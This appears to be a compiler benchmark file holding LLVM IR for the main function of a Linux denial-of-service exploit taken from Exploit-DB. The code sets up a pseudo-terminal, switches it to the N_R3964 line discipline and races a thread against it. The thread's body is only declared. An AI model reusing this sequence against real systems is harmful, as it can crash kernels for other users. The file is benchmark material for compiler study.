; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_46744.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/dos/extr_46744.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@ptm_fd = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [6 x i8] c"getpt\00", align 1
@.str.1 = private unnamed_addr constant [9 x i8] c"unlockpt\00", align 1
@TIOCGPTPEER = common dso_local global i32 0, align 4
@O_RDWR = common dso_local global i32* null, align 8
@slave_fd = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [12 x i8] c"TIOCGPTPEER\00", align 1
@.str.3 = private unnamed_addr constant [43 x i8] c"-----------------------------------------\0A\00", align 1
@.str.4 = private unnamed_addr constant [21 x i8] c"ls -l /proc/$PPID/fd\00", align 1
@N_R3964 = common dso_local global i32 0, align 4
@TIOCSETD = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [9 x i8] c"TIOCSETD\00", align 1
@.str.6 = private unnamed_addr constant [15 x i8] c"pthread_create\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 0, i32* %1, align 4
  %4 = call i32 (...) @getpt()
  store i32 %4, i32* @ptm_fd, align 4
  %5 = load i32, i32* @ptm_fd, align 4
  %6 = icmp eq i32 %5, -1
  br i1 %6, label %7, label %9

7:                                                ; preds = %0
  %8 = call i32 @err(i32 1, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str, i64 0, i64 0))
  br label %9

9:                                                ; preds = %7, %0
  %10 = load i32, i32* @ptm_fd, align 4
  %11 = call i64 @unlockpt(i32 %10)
  %12 = icmp ne i64 %11, 0
  br i1 %12, label %13, label %15

13:                                               ; preds = %9
  %14 = call i32 @err(i32 1, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.1, i64 0, i64 0))
  br label %15

15:                                               ; preds = %13, %9
  %16 = load i32, i32* @ptm_fd, align 4
  %17 = load i32, i32* @TIOCGPTPEER, align 4
  %18 = load i32*, i32** @O_RDWR, align 8
  %19 = call i32 @ioctl(i32 %16, i32 %17, i32* %18)
  store i32 %19, i32* @slave_fd, align 4
  %20 = load i32, i32* @slave_fd, align 4
  %21 = icmp eq i32 %20, -1
  br i1 %21, label %22, label %24

22:                                               ; preds = %15
  %23 = call i32 @err(i32 1, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0))
  br label %24

24:                                               ; preds = %22, %15
  %25 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.3, i64 0, i64 0))
  %26 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.4, i64 0, i64 0))
  %27 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.3, i64 0, i64 0))
  %28 = load i32, i32* @N_R3964, align 4
  store i32 %28, i32* %2, align 4
  %29 = load i32, i32* @slave_fd, align 4
  %30 = load i32, i32* @TIOCSETD, align 4
  %31 = call i32 @ioctl(i32 %29, i32 %30, i32* %2)
  %32 = icmp ne i32 %31, 0
  br i1 %32, label %33, label %35

33:                                               ; preds = %24
  %34 = call i32 @err(i32 1, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.5, i64 0, i64 0))
  br label %35

35:                                               ; preds = %33, %24
  %36 = call i64 @pthread_create(i32* %3, i32* null, i32 (i32*)* @thread_fn, i32* null)
  %37 = icmp ne i64 %36, 0
  br i1 %37, label %38, label %40

38:                                               ; preds = %35
  %39 = call i32 @errx(i32 1, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.6, i64 0, i64 0))
  br label %40

40:                                               ; preds = %38, %35
  %41 = call i32 @thread_fn(i32* null)
  ret i32 0
}

declare dso_local i32 @getpt(...) #1

declare dso_local i32 @err(i32, i8*) #1

declare dso_local i64 @unlockpt(i32) #1

declare dso_local i32 @ioctl(i32, i32, i32*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @system(i8*) #1

declare !callback !2 dso_local i64 @pthread_create(i32*, i32*, i32 (i32*)*, i32*) #1

declare dso_local i32 @thread_fn(i32*) #1

declare dso_local i32 @errx(i32, i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
!2 = !{!3}
!3 = !{i64 2, i64 3, i1 false}
